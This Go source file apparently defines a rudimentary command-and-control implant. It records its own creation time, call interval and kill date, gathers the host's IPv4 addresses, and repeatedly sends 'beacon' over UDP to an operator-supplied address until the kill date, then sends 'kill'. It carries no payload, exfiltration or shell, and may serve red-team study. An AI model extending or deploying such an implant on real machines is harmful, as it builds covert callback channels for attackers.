package main

import (
	"encoding/json"
	"fmt"
	"math/rand"
	"net"
	"os"
	"strconv"
	"strings"
	"time"
)

type Connection struct {
	Address string `json:"Address"`
	Port    int    `json:"Port"`
}

type Implant_Stats struct {
	Creation    string `json:"Creation"`
	Last_Update string `json:"Last Updated"`
	Kill_Date   string `json:"Kill Date"`
	Interval    string `json:"Interval"`
}

type Implant struct {
	Connection *Connection    `json:"Connection"`
	Stats      *Implant_Stats `json:"Statistics"`
	Local_UDP  *net.UDPAddr
	Remote_UDP *net.UDPAddr
	IP_Addrs   []net.IP
}

func (i Implant) Get_Connection() *Connection {
	return i.Connection
}
func (i Implant) Get_Stats() *Implant_Stats {
	return i.Stats
}

func Create_Implant(address string, port int, call_interval string, lifetime string) (Implant, error) {
	if port == 0 {
		port = rand.Intn(65535)
	}
	connection := &Connection{
		address,
		port,
	}
	kill_duration, err := time.ParseDuration(lifetime)
	if err != nil {
		panic("incorrect lifetime duration e.g. Xs Xm Xh")
	}
	kill_date := time.Now().Add(kill_duration)
	creation := time.Now()
	last_update := creation
	stats := &Implant_Stats{
		Creation:    creation.String(),
		Last_Update: last_update.String(),
		Kill_Date:   kill_date.Format(time.UnixDate),
		Interval:    call_interval,
	}
	return Implant{Stats: stats, Connection: connection, IP_Addrs: []net.IP{}}, nil
}

func (i *Implant) get_outbound_interface() {
	a, _ := net.InterfaceAddrs()
	for iface := range a {
		ip, _, _ := net.ParseCIDR(a[iface].String())
		if !ip.IsLoopback() && !strings.Contains(ip.String(), ":") && !ip.IsLinkLocalUnicast() && !ip.IsLinkLocalMulticast() {
			i.IP_Addrs = append(i.IP_Addrs, ip)
		}
	}
}

func String(i Implant) string {
	implant, err := json.MarshalIndent(i, "\t", "\t")
	if err != nil {
		fmt.Println(err)
	}
	return string(implant)
}

func (i Implant) Beacon(a chan string, kill_date time.Time) {
	// Check kill date
	interval_duration, err := time.ParseDuration(i.Stats.Interval)
	if err != nil {
		panic("incorrect interval duration e.g. Xs Xm Xh")
	}
	for !kill_date.Before(time.Now()) {
		// Do Beaconing
		a <- "beaconing"
		con, _ := net.Dial("udp", fmt.Sprintf("%s:%d", i.Connection.Address, i.Connection.Port))
		// im, _ := json.Marshal("beacon")
		con.Write([]byte("beacon\n"))
		con.Close()
		time.Sleep(interval_duration)
	}
	// Final dial out to notify beacon death
	con, _ := net.Dial("udp", fmt.Sprintf("%s:%d", i.Connection.Address, i.Connection.Port))
	con.Write([]byte("kill\n"))
	con.Close()
	a <- "killed"
}

func (i *Implant) Run() {
	kill_date, _ := time.Parse(time.UnixDate, i.Stats.Kill_Date)
	a := make(chan string, 1)
	go i.Beacon(a, kill_date)
	for {
		select {
		case status := <-a:
			if status == "killed" {
				println("killing beacon timeout")
				return
			} else {
				println(status)
			}
		case <-time.After(30 * time.Second):
			println("timed out")
			return
		}
	}
}

func main() {
	ip := os.Args[1]
	port, _ := strconv.Atoi(os.Args[2])
	interval := os.Args[3]
	kill_date := os.Args[4]
	implant, err := Create_Implant(ip, port, interval, kill_date)
	if err != nil {
		println(err)
	}
	implant.get_outbound_interface()
	implant.Run()
}
